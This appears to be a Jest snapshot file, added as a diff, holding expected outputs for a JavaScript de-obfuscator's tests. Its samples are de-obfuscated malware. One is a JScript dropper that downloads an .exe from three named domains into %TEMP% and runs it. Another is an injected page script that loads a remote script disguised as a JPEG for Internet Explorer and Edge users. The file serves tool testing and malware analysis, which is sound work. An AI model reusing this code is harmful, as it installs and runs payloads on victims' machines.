@@ -1,0 +1,1293 @@
+// Jest Snapshot v1, https://goo.gl/fbAQLP
+
+exports[`de-obfuscates sample 0 1`] = `"const vqeJMM = document.createElement(\\"object\\");"`;
+
+exports[`de-obfuscates sample 1 1`] = `"GPSweCkB.setAttribute(\\"classid\\", \\"clsid:55963676-2F5E-4BAF-AC28-CF26AA587566\\");"`;
+
+exports[`de-obfuscates sample 2 1`] = `"const GPSweCkB = document.createElement(\\"object\\");"`;
+
+exports[`de-obfuscates sample 3 1`] = `"34;"`;
+
+exports[`de-obfuscates sample 4 1`] = `"const vqeJMM = document.createElement(\\"object\\");"`;
+
+exports[`de-obfuscates sample 5 1`] = `"vqeJMM.setAttribute(\\"classid\\", \\"clsid:55963676-2F5E-4BAF-AC28-CF26AA587566\\");"`;
+
+exports[`de-obfuscates sample 6 1`] = `"vqeJMM.url = \\"http://127.0.0.1:8080//puFbJofTczCYRuAoQ/\\";"`;
+
+exports[`de-obfuscates sample 7 1`] = `"\\"s-ap\\";"`;
+
+exports[`de-obfuscates sample 8 1`] = `
+"const stroke = \\"5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09\\";
+function bhj75() {
+  c = \\"()*1\\";
+  return c;
+}
+function bhj100() {
+  c = \\"ys\\";
+  return c;
+}
+function bhj111() {
+  c = \\"ySta\\";
+  return c;
+}
+function bhj176() {
+  c = \\"()\\";
+  return c;
+}
+function bhj61() {
+  c = 's(\\"%T';
+  return c;
+}
+function bhj67() {
+  c = \\"arC\\";
+  return c;
+}
+function bhj179() {
+  c = \\" try \\";
+  return c;
+}
+function bhj152() {
+  c = \\"ositi\\";
+  return c;
+}
+function bhj54() {
+  c = \\"xpan\\";
+  return c;
+}
+function bhj149() {
+  c = \\"dn =\\";
+  return c;
+}
+function bhj126() {
+  c = '\\"AD';
+  return c;
+}
+function bhj223() {
+  c = \\"2); d\\";
+  return c;
+}
+function bhj19() {
+  c = \\"com\\";
+  return c;
+}
+function bhj104() {
+  c = \\"= fu\\";
+  return c;
+}
+function bhj198() {
+  c = \\"ke, f\\";
+  return c;
+}
+function bhj106() {
+  c = \\"on()\\";
+  return c;
+}
+function bhj217() {
+  c = \\" }; }\\";
+  return c;
+}
+function bhj167() {
+  c = \\"); } \\";
+  return c;
+}
+function bhj62() {
+  c = \\"EMP\\";
+  return c;
+}
+function bhj204() {
+  c = \\"();\\";
+  return c;
+}
+function bhj210() {
+  c = \\" if (\\";
+  return c;
+}
+function bhj122() {
+  c = \\"new \\";
+  return c;
+}
+function bhj64() {
+  c = \\")+Str\\";
+  return c;
+}
+function bhj27() {
+  c = \\" fo\\";
+  return c;
+}
+function bhj87() {
+  c = \\"= new\\";
+  return c;
+}
+function bhj35() {
+  c = \\"i++)\\";
+  return c;
+}
+function bhj160() {
+  c = \\"fn,\\";
+  return c;
+}
+function bhj175() {
+  c = \\"se\\";
+  return c;
+}
+function bhj182() {
+  c = \\"en(\\";
+  return c;
+}
+function bhj158() {
+  c = \\"oFi\\";
+  return c;
+}
+function bhj116() {
+  c = \\"stat\\";
+  return c;
+}
+function bhj23() {
+  c = \\"om\\";
+  return c;
+}
+function bhj102() {
+  c = \\"ech\\";
+  return c;
+}
+function bhj11() {
+  c = \\"reba\\";
+  return c;
+}
+function bhj90() {
+  c = \\"XOb\\";
+  return c;
+}
+function bhj105() {
+  c = \\"ncti\\";
+  return c;
+}
+function bhj213() {
+  c = \\"= \\";
+  return c;
+}
+function bhj12() {
+  c = \\"r.co\\";
+  return c;
+}
+function bhj132() {
+  c = \\"(); x\\";
+  return c;
+}
+function bhj133() {
+  c = \\"a.typ\\";
+  return c;
+}
+function bhj70() {
+  c = \\"ath.\\";
+  return c;
+}
+function bhj53() {
+  c = \\" ws.E\\";
+  return c;
+}
+function bhj96() {
+  c = 'TP\\")';
+  return c;
+}
+function bhj206() {
+  c = \\"catc\\";
+  return c;
+}
+function bhj65() {
+  c = \\"ing.f\\";
+  return c;
+}
+function bhj221() {
+  c = \\"dl(\\";
+  return c;
+}
+function bhj72() {
+  c = \\"nd(Ma\\";
+  return c;
+}
+function bhj77() {
+  c = \\"0000\\";
+  return c;
+}
+function bhj88() {
+  c = \\" A\\";
+  return c;
+}
+function bhj222() {
+  c = \\"225\\";
+  return c;
+}
+function bhj207() {
+  c = \\"h (\\";
+  return c;
+}
+function bhj117() {
+  c = \\"us ==\\";
+  return c;
+}
+function bhj147() {
+  c = \\"5000\\";
+  return c;
+}
+function bhj93() {
+  c = \\"ML2.\\";
+  return c;
+}
+function bhj177() {
+  c = \\"; }\\";
+  return c;
+}
+function bhj47() {
+  c = \\"ipt.\\";
+  return c;
+}
+function bhj208() {
+  c = \\"er)\\";
+  return c;
+}
+function bhj188() {
+  c = '+\\"';
+  return c;
+}
+function bhj31() {
+  c = \\"0;\\";
+  return c;
+}
+function bhj57() {
+  c = \\"iron\\";
+  return c;
+}
+function bhj143() {
+  c = \\" if\\";
+  return c;
+}
+function bhj86() {
+  c = \\"xo \\";
+  return c;
+}
+function bhj199() {
+  c = \\"alse\\";
+  return c;
+}
+function bhj135() {
+  c = \\"1; xa\\";
+  return c;
+}
+function bhj115() {
+  c = \\"& xo.\\";
+  return c;
+}
+function bhj134() {
+  c = \\"e = \\";
+  return c;
+}
+function bhj124() {
+  c = \\"eXOb\\";
+  return c;
+}
+function bhj16() {
+  c = \\"oma\\";
+  return c;
+}
+function bhj138() {
+  c = \\"(xo.\\";
+  return c;
+}
+function bhj136() {
+  c = \\".wri\\";
+  return c;
+}
+function bhj49() {
+  c = 'l\\"';
+  return c;
+}
+function bhj129() {
+  c = '\\"); x';
+  return c;
+}
+function bhj2() {
+  c = \\"nct\\";
+  return c;
+}
+function bhj71() {
+  c = \\"rou\\";
+  return c;
+}
+function bhj164() {
+  c = \\"s.\\";
+  return c;
+}
+function bhj183() {
+  c = '\\"G';
+  return c;
+}
+function bhj22() {
+  c = \\"rch.c\\";
+  return c;
+}
+function bhj95() {
+  c = \\"HT\\";
+  return c;
+}
+function bhj151() {
+  c = \\"a.p\\";
+  return c;
+}
+function bhj45() {
+  c = \\"WS\\";
+  return c;
+}
+function bhj209() {
+  c = \\" {};\\";
+  return c;
+}
+function bhj4() {
+  c = \\"l(\\";
+  return c;
+}
+function bhj201() {
+  c = \\"xo\\";
+  return c;
+}
+function bhj92() {
+  c = '\\"MSX';
+  return c;
+}
+function bhj37() {
+  c = \\"var w\\";
+  return c;
+}
+function bhj193() {
+  c = 'nd=\\"';
+  return c;
+}
+function bhj187() {
+  c = \\"+b[i]\\";
+  return c;
+}
+function bhj79() {
+  c = '\\".';
+  return c;
+}
+function bhj171() {
+  c = \\") {\\";
+  return c;
+}
+function bhj163() {
+  c = \\" { w\\";
+  return c;
+}
+function bhj172() {
+  c = \\"}; }\\";
+  return c;
+}
+function bhj68() {
+  c = \\"ode(9\\";
+  return c;
+}
+function bhj44() {
+  c = 't(\\"';
+  return c;
+}
+function bhj166() {
+  c = \\"n,1,0\\";
+  return c;
+}
+function bhj69() {
+  c = \\"2)+M\\";
+  return c;
+}
+function bhj48() {
+  c = \\"Shel\\";
+  return c;
+}
+function bhj55() {
+  c = \\"dE\\";
+  return c;
+}
+function bhj139() {
+  c = \\"Res\\";
+  return c;
+}
+function bhj123() {
+  c = \\"Activ\\";
+  return c;
+}
+function bhj205() {
+  c = \\" } \\";
+  return c;
+}
+function bhj80() {
+  c = \\"exe\\";
+  return c;
+}
+function bhj91() {
+  c = \\"ject(\\";
+  return c;
+}
+function bhj189() {
+  c = \\"/doc\\";
+  return c;
+}
+function bhj148() {
+  c = \\") { \\";
+  return c;
+}
+function bhj214() {
+  c = \\"1) b\\";
+  return c;
+}
+function bhj5() {
+  c = \\"fr) {\\";
+  return c;
+}
+function bhj184() {
+  c = 'ET\\",\\"';
+  return c;
+}
+function bhj74() {
+  c = \\"andom\\";
+  return c;
+}
+function bhj178() {
+  c = \\"; };\\";
+  return c;
+}
+function bhj97() {
+  c = \\"; xo.\\";
+  return c;
+}
+function bhj144() {
+  c = \\" (xa\\";
+  return c;
+}
+function bhj89() {
+  c = \\"ctive\\";
+  return c;
+}
+function bhj66() {
+  c = \\"romCh\\";
+  return c;
+}
+function bhj40() {
+  c = \\"Ac\\";
+  return c;
+}
+function bhj141() {
+  c = \\"Bo\\";
+  return c;
+}
+function bhj59() {
+  c = \\"tStri\\";
+  return c;
+}
+function bhj190() {
+  c = \\"umen\\";
+  return c;
+}
+function bhj7() {
+  c = \\"ar \\";
+  return c;
+}
+function bhj50() {
+  c = \\");\\";
+  return c;
+}
+function bhj130() {
+  c = \\"a.op\\";
+  return c;
+}
+function bhj195() {
+  c = '\\"&i';
+  return c;
+}
+function bhj145() {
+  c = \\".siz\\";
+  return c;
+}
+function lxd() {
+  return c;
+}
+function bhj118() {
+  c = \\" 200\\";
+  return c;
+}
+function bhj154() {
+  c = \\"= 0\\";
+  return c;
+}
+function bhj121() {
+  c = \\"xa = \\";
+  return c;
+}
+function bhj219() {
+  c = \\"93\\";
+  return c;
+}
+function bhj194() {
+  c = \\"+fr+\\";
+  return c;
+}
+function bhj120() {
+  c = \\"ar \\";
+  return c;
+}
+function bhj226() {
+  c = \\");\\";
+  return c;
+}
+function bhj20() {
+  c = \\" ayus\\";
+  return c;
+}
+function bhj17() {
+  c = \\"tth\\";
+  return c;
+}
+function bhj58() {
+  c = \\"men\\";
+  return c;
+}
+function bhj212() {
+  c = \\" =\\";
+  return c;
+}
+function bhj33() {
+  c = \\"b.len\\";
+  return c;
+}
+function bhj98() {
+  c = \\"onre\\";
+  return c;
+}
+function bhj107() {
+  c = \\" { if\\";
+  return c;
+}
+function bhj215() {
+  c = \\"re\\";
+  return c;
+}
+function bhj83() {
+  c = \\"dn \\";
+  return c;
+}
+function bhj60() {
+  c = \\"ng\\";
+  return c;
+}
+function bhj38() {
+  c = \\"s = n\\";
+  return c;
+}
+function bhj99() {
+  c = \\"ad\\";
+  return c;
+}
+function bhj73() {
+  c = \\"th.r\\";
+  return c;
+}
+function bhj8() {
+  c = \\"b = \\";
+  return c;
+}
+function bhj29() {
+  c = \\"var \\";
+  return c;
+}
+function bhj216() {
+  c = \\"ak;\\";
+  return c;
+}
+function bhj10() {
+  c = \\"rmac\\";
+  return c;
+}
+function bhj159() {
+  c = \\"le(\\";
+  return c;
+}
+function bhj52() {
+  c = \\"fn =\\";
+  return c;
+}
+function bhj146() {
+  c = \\"e > \\";
+  return c;
+}
+function bhj157() {
+  c = \\"aveT\\";
+  return c;
+}
+function bhj109() {
+  c = \\"xo\\";
+  return c;
+}
+function bhj() {
+  return \\"al\\";
+}
+function xcil() {
+  return \\"ev\\";
+}
+function nz(uqf) {
+  c = uqf;
+}
+function bhj9() {
+  c = '\\"ha';
+  return c;
+}
+function bhj1() {
+  c = \\"fu\\";
+  return c;
+}
+function bhj51() {
+  c = \\" var \\";
+  return c;
+}
+function bhj161() {
+  c = \\"2);\\";
+  return c;
+}
+function bhj125() {
+  c = \\"ject(\\";
+  return c;
+}
+function bhj24() {
+  c = '\\".spl';
+  return c;
+}
+function bhj225() {
+  c = \\"43\\";
+  return c;
+}
+function bhj224() {
+  c = \\"l(69\\";
+  return c;
+}
+function bhj113() {
+  c = \\"==\\";
+  return c;
+}
+function bhj25() {
+  c = \\"it(\\";
+  return c;
+}
+function bhj127() {
+  c = \\"ODB.S\\";
+  return c;
+}
+function bhj18() {
+  c = \\"ew.\\";
+  return c;
+}
+function bhj170() {
+  c = \\"er\\";
+  return c;
+}
+function bhj28() {
+  c = \\"r (\\";
+  return c;
+}
+function bhj150() {
+  c = \\" 1; x\\";
+  return c;
+}
+function bhj153() {
+  c = \\"on \\";
+  return c;
+}
+function bhj34() {
+  c = \\"gth; \\";
+  return c;
+}
+function bhj82() {
+  c = \\"r \\";
+  return c;
+}
+function bhj56() {
+  c = \\"nv\\";
+  return c;
+}
+function bhj169() {
+  c = \\"ch (\\";
+  return c;
+}
+function bhj41() {
+  c = \\"tiv\\";
+  return c;
+}
+function bhj142() {
+  c = \\"dy);\\";
+  return c;
+}
+function bhj14() {
+  c = \\"adyse\\";
+  return c;
+}
+function bhj137() {
+  c = \\"te\\";
+  return c;
+}
+function bhj196() {
+  c = 'd=\\"+';
+  return c;
+}
+function bhj174() {
+  c = \\"clo\\";
+  return c;
+}
+function bhj26() {
+  c = '\\" \\");';
+  return c;
+}
+function bhj131() {
+  c = \\"en\\";
+  return c;
+}
+var fvd = \\"\\";
+var c = \\"\\";
+function bhj202() {
+  c = \\".se\\";
+  return c;
+}
+function bhj119() {
+  c = \\") { v\\";
+  return c;
+}
+function bhj165() {
+  c = \\"Run(f\\";
+  return c;
+}
+function bhj39() {
+  c = \\"ew \\";
+  return c;
+}
+function bhj30() {
+  c = \\"i=\\";
+  return c;
+}
+function bhj181() {
+  c = \\"o.op\\";
+  return c;
+}
+function bhj173() {
+  c = \\"; xa.\\";
+  return c;
+}
+function bhj85() {
+  c = \\"var \\";
+  return c;
+}
+function bhj211() {
+  c = \\"dn\\";
+  return c;
+}
+function bhj15() {
+  c = \\"tg\\";
+  return c;
+}
+function bhj110() {
+  c = \\".read\\";
+  return c;
+}
+function bhj156() {
+  c = \\"a.s\\";
+  return c;
+}
+function bhj114() {
+  c = \\" 4 &\\";
+  return c;
+}
+function bhj42() {
+  c = \\"eX\\";
+  return c;
+}
+function bhj84() {
+  c = \\"= 0; \\";
+  return c;
+}
+function bhj191() {
+  c = \\"t.php\\";
+  return c;
+}
+function bhj78() {
+  c = \\"00)+\\";
+  return c;
+}
+function bhj112() {
+  c = \\"te \\";
+  return c;
+}
+function bhj43() {
+  c = \\"Objec\\";
+  return c;
+}
+function bhj220() {
+  c = \\"91); \\";
+  return c;
+}
+function bhj103() {
+  c = \\"ange \\";
+  return c;
+}
+function bhj218() {
+  c = \\"; dl(\\";
+  return c;
+}
+function bhj94() {
+  c = \\"XML\\";
+  return c;
+}
+function bhj36() {
+  c = \\" { \\";
+  return c;
+}
+function bhj21() {
+  c = \\"o-a\\";
+  return c;
+}
+function bhj128() {
+  c = \\"tream\\";
+  return c;
+}
+function bhj186() {
+  c = '://\\"';
+  return c;
+}
+function bhj6() {
+  c = \\" v\\";
+  return c;
+}
+function bhj32() {
+  c = \\" i<\\";
+  return c;
+}
+function bhj13() {
+  c = \\"m re\\";
+  return c;
+}
+function bhj3() {
+  c = \\"ion d\\";
+  return c;
+}
+function bhj162() {
+  c = \\" try\\";
+  return c;
+}
+function bhj101() {
+  c = \\"tat\\";
+  return c;
+}
+function bhj200() {
+  c = \\"); \\";
+  return c;
+}
+function bhj63() {
+  c = '%\\"';
+  return c;
+}
+function bhj155() {
+  c = \\"; x\\";
+  return c;
+}
+function bhj203() {
+  c = \\"nd\\";
+  return c;
+}
+function bhj180() {
+  c = \\"{ x\\";
+  return c;
+}
+function bhj192() {
+  c = \\"?r\\";
+  return c;
+}
+function bhj46() {
+  c = \\"cr\\";
+  return c;
+}
+function bhj108() {
+  c = \\" (\\";
+  return c;
+}
+function bhj76() {
+  c = \\"00\\";
+  return c;
+}
+function bhj81() {
+  c = '\\"; va';
+  return c;
+}
+function bhj140() {
+  c = \\"ponse\\";
+  return c;
+}
+function bhj185() {
+  c = \\"http\\";
+  return c;
+}
+function bhj197() {
+  c = \\"stro\\";
+  return c;
+}
+function bhj168() {
+  c = \\"cat\\";
+  return c;
+}
+c = \\");\\";
+fvd =
+  'function dl(fr) { var b = \\"harmacrebar.com readysetgomatthew.com ayuso-arch.com\\".split(\\" \\"); for (var i=0; i<b.length; i++) { var ws = new ActiveXObject(\\"WScript.Shell\\"); var fn = ws.ExpandEnvironmentStrings(\\"%TEMP%\\")+String.fromCharCode(92)+Math.round(Math.random()*100000000)+\\".exe\\"; var dn = 0; var xo = new ActiveXObject(\\"MSXML2.XMLHTTP\\"); xo.onreadystatechange = function() { if (xo.readyState == 4 && xo.status == 200) { var xa = new ActiveXObject(\\"ADODB.Stream\\"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); if (xa.size > 5000) { dn = 1; xa.position = 0; xa.saveToFile(fn,2); try { ws.Run(fn,1,0); } catch (er) {}; }; xa.close(); }; }; try { xo.open(\\"GET\\",\\"http://\\"+b[i]+\\"/document.php?rnd=\\"+fr+\\"&id=\\"+stroke, false); xo.send(); } catch (er) {}; if (dn == 1) break; }; }; dl(9391); dl(2252); dl(6943);';
+function dl(fr) {
+  const b = [\\"harmacrebar.com\\", \\"readysetgomatthew.com\\", \\"ayuso-arch.com\\"];
+  for (var i = 0; i < 3; i++) {
+    const ws = new ActiveXObject(\\"WScript.Shell\\");
+    const fn =
+      ws.ExpandEnvironmentStrings(\\"%TEMP%\\") +
+      \\"\\\\\\\\\\" +
+      Math.round(Math.random() * 100000000) +
+      \\".exe\\";
+    var dn = 0;
+    const xo = new ActiveXObject(\\"MSXML2.XMLHTTP\\");
+    xo.onreadystatechange = function() {
+      if (xo.readyState == 4 && xo.status == 200) {
+        const xa = new ActiveXObject(\\"ADODB.Stream\\");
+        xa.open();
+        xa.type = 1;
+        xa.write(xo.ResponseBody);
+        if (xa.size > 5000) {
+          dn = 1;
+          xa.position = 0;
+          xa.saveToFile(fn, 2);
+          try {
+            ws.Run(fn, 1, 0);
+          } catch (er) {}
+        }
+        xa.close();
+      }
+    };
+    try {
+      xo.open(
+        \\"GET\\",
+        \\"http://\\" +
+          b[i] +
+          \\"/document.php?rnd=\\" +
+          fr +
+          \\"&id=5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09\\",
+        false
+      );
+      xo.send();
+    } catch (er) {}
+    if (dn == 1) break;
+  }
+}
+dl(9391);
+dl(2252);
+dl(6943);"
+`;
+
+exports[`de-obfuscates sample 9 1`] = `
+"const _0x7b98 = [\\"world\\", \\"hello\\"];
+(function(_0x5c7f81, _0x1109f5) {
+  const _0x4d4d7b = function(_0x39ad42) {
+    while (--_0x39ad42) {
+      _0x5c7f81.push(_0x5c7f81.shift());
+    }
+  };
+  _0x4d4d7b(++_0x1109f5);
+})(_0x7b98, 0x93);
+const _0x87b9 = function(_0x46a655, _0x343681) {
+  _0x46a655 = _0x46a655 - 0x0;
+  const _0xb28dc8 = _0x7b98[_0x46a655];
+  return _0xb28dc8;
+};
+const a = _0x87b9(\\"0x0\\")(function(_0x45597e) {
+  return a + _0x45597e;
+})(_0x87b9(\\"0x1\\"));"
+`;
+
+exports[`de-obfuscates sample 10 1`] = `
+"(function() {
+  const v = 50;
+  var e = 0;
+  function b() {
+    e++;
+    if (e > v) return false;
+    if (!document.body) setTimeout(b, 500);
+    else
+      (function() {
+        function t(s) {
+          return (s + \\"\\").replace(/[a-z]/gi, function(s) {
+            return String.fromCharCode(
+              s.charCodeAt(0) + (s.toLowerCase() < \\"n\\" ? 13 : -13)
+            );
+          });
+        }
+        const i = [
+          \\"qg-k\\",
+          \\"inw/\\",
+          \\"rtnz\\",
+          \\"fryv\\",
+          \\".n8o\\",
+          \\"graf\\",
+          \\"c\\",
+          \\"RVFZ\\",
+          \\"epfn\\",
+          \\"vepf\\",
+          \\"\\\\\\\\rtq\\",
+          \\" GA \\",
+          \\"qavJ\\",
+          \\"v/i/\\",
+          \\"cggu\\",
+          \\".21/\\",
+          \\"gkrg\\",
+          \\"os8q\\",
+          \\"21/f\\",
+          \\"=fre\\",
+          \\"6q4q\\",
+          \\"vckr\\",
+          \\"R )*\\",
+          \\"jra.\\",
+          \\"gar\\",
+          \\"9-0[\\",
+          \\".(01\\",
+          \\"80np\\",
+          \\"gcv\\",
+          \\"GA\\",
+          \\")]+\\",
+          \\"9023\\",
+          \\"gc\\",
+          \\"48os\\",
+          \\"trcw\\"
+        ];
+        i = [
+          \\"x-td\\",
+          \\"/jav\\",
+          \\"mage\\",
+          \\"iles\\",
+          \\"b8a.\\",
+          \\"snet\\",
+          \\"p\\",
+          \\"MSIE\\",
+          \\"ascr\\",
+          \\"scri\\",
+          \\"dge\\\\\\\\\\",
+          \\" NT \\",
+          \\"Wind\\",
+          \\"/v/i\\",
+          \\"http\\",
+          \\"/12.\\",
+          \\"text\\",
+          \\"d8fb\\",
+          \\"s/12\\",
+          \\"res=\\",
+          \\"d4d6\\",
+          \\"expi\\",
+          \\"*) E\\",
+          \\".new\\",
+          \\"ent\\",
+          \\"[0-9\\",
+          \\"10(.\\",
+          \\"ca08\\",
+          \\"ipt\\",
+          \\"NT\\",
+          \\"+])\\",
+          \\"3209\\",
+          \\"pt\\",
+          \\"fb84\\",
+          \\"jpeg\\"
+        ];
+        function je(v, u) {
+          var w = false;
+          var d = false;
+          for (var k = 0; k < v.length; k++) {
+            const p = new RegExp(v[k][0], v[k][1]);
+            if (v[k][2]) {
+              w = true;
+              if (p.test(u)) {
+                d = true;
+              }
+            } else {
+              if (p.test(u)) {
+                return false;
+              }
+            }
+          }
+          if (false) {
+            return false;
+          }
+          return true;
+        }
+        const ud = navigator.userAgent;
+        if (
+          je(
+            [
+              [\\"MSIE\\", \\"i\\", 1],
+              [\\"Trident\\", \\"i\\", 1],
+              [\\"(Windows NT 10(.*) Edge\\\\\\\\/12.[0-9+])\\", \\"i\\", 1]
+            ],
+            ud
+          ) &&
+          je([[\\"Windows NT\\", \\"i\\", 1]], ud)
+        ) {
+          (function() {
+            const g = \\"x-tds-app\\";
+            const j = document.cookie.match(
+              new RegExp(\\"(?:^|; )x-tds-app=([^;]*)\\")
+            );
+            if (!j) {
+              const s = document.createElement(\\"script\\");
+              s.type = \\"text/javascript\\";
+              s.src =
+                \\"http://files.newsnetz.cn/v/images/12/7/04c73d4d6ca08320970d3fb84d8fbb8a.jpeg\\";
+              const m = document.body;
+              m.insertBefore(s, m.lastChild);
+              const d = new Date();
+              d.setTime(d.getTime() + 259200000);
+              document.cookie = \\"x-tds-app=1; expires=\\" + d;
+            }
+          })();
+        }
+      })();
+  }
+  e++;
+  if (e > v) return false;
+  if (!document.body) setTimeout(b, 500);
+  else
+    (function() {
+      function t(s) {
+        return (s + \\"\\").replace(/[a-z]/gi, function(s) {
+          return String.fromCharCode(
+            s.charCodeAt(0) + (s.toLowerCase() < \\"n\\" ? 13 : -13)
+          );
+        });
+      }
+      const i = [
+        \\"qg-k\\",
+        \\"inw/\\",
+        \\"rtnz\\",
+        \\"fryv\\",
+        \\".n8o\\",
+        \\"graf\\",
+        \\"c\\",
+        \\"RVFZ\\",
+        \\"epfn\\",
+        \\"vepf\\",
+        \\"\\\\\\\\rtq\\",
+        \\" GA \\",
+        \\"qavJ\\",
+        \\"v/i/\\",
+        \\"cggu\\",
+        \\".21/\\",
+        \\"gkrg\\",
+        \\"os8q\\",
+        \\"21/f\\",
+        \\"=fre\\",
+        \\"6q4q\\",
+        \\"vckr\\",
+        \\"R )*\\",
+        \\"jra.\\",
+        \\"gar\\",
+        \\"9-0[\\",
+        \\".(01\\",
+        \\"80np\\",
+        \\"gcv\\",
+        \\"GA\\",
+        \\")]+\\",
+        \\"9023\\",
+        \\"gc\\",
+        \\"48os\\",
+        \\"trcw\\"
+      ];
+      i = [
+        \\"x-td\\",
+        \\"/jav\\",
+        \\"mage\\",
+        \\"iles\\",
+        \\"b8a.\\",
+        \\"snet\\",
+        \\"p\\",
+        \\"MSIE\\",
+        \\"ascr\\",
+        \\"scri\\",
+        \\"dge\\\\\\\\\\",
+        \\" NT \\",
+        \\"Wind\\",
+        \\"/v/i\\",
+        \\"http\\",
+        \\"/12.\\",
+        \\"text\\",
+        \\"d8fb\\",
+        \\"s/12\\",
+        \\"res=\\",
+        \\"d4d6\\",
+        \\"expi\\",
+        \\"*) E\\",
+        \\".new\\",
+        \\"ent\\",
+        \\"[0-9\\",
+        \\"10(.\\",
+        \\"ca08\\",
+        \\"ipt\\",
+        \\"NT\\",
+        \\"+])\\",
+        \\"3209\\",
+        \\"pt\\",
+        \\"fb84\\",
+        \\"jpeg\\"
+      ];
+      function je(v, u) {
+        var w = false;
+        var d = false;
+        for (var k = 0; k < v.length; k++) {
+          const p = new RegExp(v[k][0], v[k][1]);
+          if (v[k][2]) {
+            w = true;
+            if (p.test(u)) {
+              d = true;
+            }
+          } else {
+            if (p.test(u)) {
+              return false;
+            }
+          }
+        }
+        if (false) {
+          return false;
+        }
+        return true;
+      }
+      const ud = navigator.userAgent;
+      if (
+        je(
+          [
+            [\\"MSIE\\", \\"i\\", 1],
+            [\\"Trident\\", \\"i\\", 1],
+            [\\"(Windows NT 10(.*) Edge\\\\\\\\/12.[0-9+])\\", \\"i\\", 1]
+          ],
+          ud
+        ) &&
+        je([[\\"Windows NT\\", \\"i\\", 1]], ud)
+      ) {
+        (function() {
+          const g = \\"x-tds-app\\";
+          const j = document.cookie.match(
+            new RegExp(\\"(?:^|; )x-tds-app=([^;]*)\\")
+          );
+          if (!j) {
+            const s = document.createElement(\\"script\\");
+            s.type = \\"text/javascript\\";
+            s.src =
+              \\"http://files.newsnetz.cn/v/images/12/7/04c73d4d6ca08320970d3fb84d8fbb8a.jpeg\\";
+            const m = document.body;
+            m.insertBefore(s, m.lastChild);
+            const d = new Date();
+            d.setTime(d.getTime() + 259200000);
+            document.cookie = \\"x-tds-app=1; expires=\\" + d;
+          }
+        })();
+      }
+    })();
+});"
+`;
